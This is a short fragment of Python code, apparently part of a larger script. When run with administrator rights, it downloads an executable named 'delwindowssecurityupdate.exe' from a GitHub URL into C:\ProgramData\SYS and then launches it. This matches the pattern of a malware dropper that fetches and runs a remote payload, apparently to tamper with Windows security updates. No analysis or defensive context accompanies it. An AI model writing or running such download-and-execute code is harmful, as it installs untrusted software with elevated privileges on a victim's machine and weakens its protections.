...
if is_admin():
    ...
    download("https://github.com/MASMob2022/pyw.download/raw/main/delwindowssecurityupdate.exe", dest_folder="C:\ProgramData\SYS")

    time.sleep(5)

    os.startfile("C:\ProgramData/SYS/delwindowssecurityupdate.exe")
